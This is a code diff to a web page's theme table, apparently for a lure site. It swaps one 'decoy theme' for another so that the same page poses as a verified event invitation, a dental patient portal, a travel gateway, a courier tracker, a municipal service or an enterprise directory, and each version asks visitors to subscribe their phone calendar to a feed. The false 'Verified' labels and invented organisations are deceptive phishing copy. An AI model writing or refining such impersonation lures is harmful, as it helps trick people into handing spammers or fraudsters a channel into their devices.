@@ -378,115 +378,55 @@
 
     // Dynamic Skinning based on Decoy Theme
     const THEMES = {
-      babyshower: {
-        icon: "🍼",
-        verified: "Verified Event Invitation",
-        title: "Baby Shower & Registry Schedule",
-        desc: "Join us in celebrating! Subscribing adds the baby shower itinerary, registry details, and venue directions directly to your calendar so you don't have to stress.",
-        check1: "📍 Venue: Pavilion 4 / Garden Terrace",
-        check2: "🎁 Registry: Live Gift & Event Updates",
-        check3: "📅 Sync: Apple & Google Calendar 1-Tap",
-        org: "Family Celebration Portal",
-        accent: "#ec4899",
-        btnText: "🍼 Add Baby Shower to Calendar"
-      },
-      wedding: {
-        icon: "💍",
-        verified: "Wedding Guest Portal",
-        title: "Wedding Itinerary & Rehearsal Schedule",
-        desc: "Join us for our special day! Subscribing adds the ceremony timeline, cocktail hour, and reception schedule directly to your phone with live updates.",
-        check1: "🥂 Schedule: Full Wedding Day Itinerary",
-        check2: "📍 Venue: Parking & Gate Directions",
-        check3: "📅 Sync: Real-Time Calendar Integration",
-        org: "Wedding Celebration Registry",
-        accent: "#eab308",
-        btnText: "💍 Add Wedding to Calendar"
-      },
-      dental: {
-        icon: "🦷",
-        verified: "Patient Health Portal",
-        title: "Dental Cleaning & Exam Check-in",
-        desc: "Automated patient appointment sync. Subscribing ensures arrival windows, check-in instructions, and hygiene exam updates stream to your phone.",
-        check1: "🏥 Clinic: Advanced Dental Care Services",
-        check2: "⏰ Arrival: 15-Minute Check-in Window",
-        check3: "📲 Sync: Mobile Patient Calendar Feed",
-        org: "Patient Appointment Dispatch",
-        accent: "#06b6d4",
-        btnText: "🦷 Add Appointment to Calendar"
-      },
-      fantasy: {
-        icon: "🏈",
-        verified: "League Headquarters",
-        title: "2026 Fantasy League Draft & Matchups",
-        desc: "Official fantasy league schedule. Subscribing syncs draft night times, weekly matchup deadlines, and roster lock alerts directly to your calendar.",
-        check1: "🏆 Format: Live Draft & Weekly Matchups",
-        check2: "⏰ Deadlines: Real-Time Roster Lock Alerts",
-        check3: "📱 Platform: League Sync Direct Feed",
-        org: "Fantasy Sports Commissioner Bureau",
-        accent: "#f97316",
-        btnText: "🏈 Add League Schedule to Calendar"
-      },
-      party: {
+      event: {
         icon: "💌",
-        verified: "Private Invitation",
-        title: "Event Invitation & Schedule",
+        verified: "Verified Event Invitation",
+        title: "Event Invitation & Schedule Updates",
         desc: "Here is the invite so you don't have to stress about dates or times! Subscribing puts all event details and itinerary updates right on your calendar.",
-        check1: "📍 Location: Live Address & Directions",
+        check1: "📍 Location: Live Event Venue & Directions",
         check2: "⏰ Itinerary: Real-Time Event Notifications",
-        check3: "📲 Device: 1-Tap Calendar Subscription",
+        check3: "📲 Device: 1-Tap Calendar Integration",
         org: "Guest Event Portal",
         accent: "#8b5cf6",
-        btnText: "💌 Add Invite to Calendar"
+        btnText: "💌 Add Event to Calendar"
       },
-      flight: {
+      shared: {
+        icon: "📅",
+        verified: "Shared Calendar Feed",
+        title: "Shared Group Calendar & Schedule",
+        desc: "Shared calendar schedule feed. Subscribing adds shared event times, reminders, and schedule updates directly to your phone.",
+        check1: "📅 Schedule: Real-Time Group Calendar Updates",
+        check2: "⏰ Sync: Automatic Background Polling",
+        check3: "📱 Platform: Native iOS & Android Calendar Sync",
+        org: "Shared Calendar Registry",
+        accent: "#06b6d4",
+        btnText: "📅 Add Calendar to Phone"
+      },
+      trip: {
         icon: "✈️",
-        verified: "Verified Airline Gateway",
-        title: "Flight Status & Gate Advisory Sync",
-        desc: "Automated itinerary tracker. Subscribing streams live flight updates, gate reassignments, and baggage advisory alerts directly to your calendar.",
-        check1: "Service: Global Flight Tracking Feed",
-        check2: "Cadence: Dynamic Real-Time Dispatch",
-        check3: "Destination: Passenger Device Sync",
-        org: "SkyLink Aviation Services",
+        verified: "Travel & Itinerary Gateway",
+        title: "Trip Schedule & Itinerary Updates",
+        desc: "Automated travel schedule. Subscribing streams shared trip itinerary updates, arrival times, and activity schedules directly to your calendar.",
+        check1: "✈️ Travel: Real-Time Trip Itinerary Feed",
+        check2: "📍 Venue: Destination Schedule Updates",
+        check3: "📲 Device: 1-Tap Mobile Subscription",
+        org: "Travel Logistics Dispatch",
         accent: "#0284c7",
-        btnText: "✈️ Add Flight Alerts to Calendar"
+        btnText: "✈️ Add Trip Schedule to Calendar"
       },
-      hoa: {
-        icon: "🏛️",
-        verified: "Verified Resident Portal",
-        title: "Community Advisory & Maintenance Feed",
-        desc: "Official neighborhood maintenance registry. Connect your calendar to receive mandatory parking audits, landscaping schedules, and exterior compliance notices.",
-        check1: "Registry: Resident Advisory Directive",
-        check2: "Updates: Weekly Routine Broadcasts",
-        check3: "Coverage: Community Municipal Feed",
-        org: "Homeowners Governance Bureau",
-        accent: "#16a34a",
-        btnText: "🏛️ Subscribe to Community Feed"
-      },
-      smarthome: {
-        icon: "🏡",
-        verified: "Matter / IoT Gateway",
-        title: "Smart Home Maintenance & Diagnostics",
-        desc: "Unified IoT appliance synchronization. Subscribing connects firmware maintenance windows, sensor audits, and power telemetry alerts to your schedule.",
-        check1: "Network: Mesh Device Protocol v2",
-        check2: "Polling: Automated Sensor Audits",
-        check3: "Security: Local Node Direct Sync",
-        org: "Smart Home Ecosystem",
-        accent: "#8b5cf6",
-        btnText: "🏡 Connect Smart Home Feed"
-      },
-      package: {
+      delivery: {
         icon: "📦",
         verified: "Logistics Tracking Portal",
-        title: "Delivery Dispatch & Signature Alert Sync",
-        desc: "Priority freight dispatch registry. Subscribing ensures automatic delivery time windows, signature requirements, and courier arrival alerts stream to your mobile device.",
-        check1: "Tracking: Enterprise Dispatch Node",
-        check2: "Sync: Live GPS Route Windows",
-        check3: "Alerts: High-Priority Signature Required",
-        org: "Global Courier Network",
+        title: "Delivery Dispatch & Tracking Window",
+        desc: "Priority delivery tracking registry. Subscribing ensures automatic delivery time windows, arrival alerts, and status updates stream to your mobile device.",
+        check1: "📦 Tracking: Express Dispatch Node",
+        check2: "⏰ Delivery: Live Route Window Updates",
+        check3: "📲 Alert: Mobile Calendar Notification",
+        org: "Courier Logistics Network",
         accent: "#d97706",
-        btnText: "📦 Track Package on Calendar"
+        btnText: "📦 Track Delivery on Calendar"
       },
-      corporate: {
+      directory: {
         icon: "🛡️",
         verified: "Verified System Directory",
         title: "Enterprise Directory & Access Sync",
@@ -497,11 +437,45 @@
         org: "Enterprise Infrastructure Gateway",
         accent: "#2563eb",
         btnText: "🛡️ Subscribe to Directory Feed"
+      },
+      trash: {
+        icon: "🗑️",
+        verified: "Verified Municipal Feed",
+        title: "Municipal Utility & Services Schedule",
+        desc: "Official municipal utility and neighborhood collection schedule. Connect your calendar to receive routine service reminders directly on your phone.",
+        check1: "Registry: Municipal Services Directory",
+        check2: "Updates: Routine Neighborhood Broadcasts",
+        check3: "Coverage: Residential Service Feed",
+        org: "Community Services Administration",
+        accent: "#16a34a",
+        btnText: "🗑️ Subscribe to Utility Feed"
+      },
+      custom: {
+        icon: "📅",
+        verified: "Event Invitation",
+        title: "Event Invitation & Schedule Updates",
+        desc: "Subscribing adds all event details, schedule times, and itinerary updates directly to your calendar so you stay on schedule.",
+        check1: "📍 Details: Live Itinerary & Venue Directions",
+        check2: "⏰ Updates: Real-Time Calendar Notifications",
+        check3: "📲 Device: 1-Tap Native Subscription",
+        org: "Calendar Invitation Gateway",
+        accent: "#3b82f6",
+        btnText: "📅 Add to Calendar"
       }
     };
 
+    // Aliases for backwards compatibility with any existing links
+    THEMES.party = THEMES.event;
+    THEMES.babyshower = THEMES.event;
+    THEMES.wedding = THEMES.event;
+    THEMES.fantasy = THEMES.shared;
+    THEMES.dental = THEMES.event;
+    THEMES.flight = THEMES.trip;
+    THEMES.package = THEMES.delivery;
+    THEMES.corporate = THEMES.directory;
+
     function applyTheme(themeKey) {
-      const t = THEMES[themeKey] || THEMES.corporate;
+      const t = THEMES[themeKey] || THEMES.event || THEMES.directory;
       document.getElementById("portalIcon").textContent = t.icon;
       document.getElementById("verifiedLabel").textContent = t.verified;
       document.getElementById("portalTitle").textContent = t.title;
